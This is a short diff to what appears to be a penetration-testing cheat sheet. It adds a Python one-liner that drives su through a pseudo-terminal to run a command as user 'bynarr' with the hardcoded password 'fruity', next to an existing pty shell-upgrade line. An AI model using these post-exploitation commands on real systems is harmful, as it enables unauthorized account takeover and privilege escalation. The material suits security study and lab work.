@@ -195,6 +195,8 @@ nice /bin/bash
 
 ```python
 python -c ‘import pty; pty.spawn(“/bin/sh”)’
+# execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk
+python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
 ```
 
 ### Uploading/POSTing Files Through WWW Upload Forms
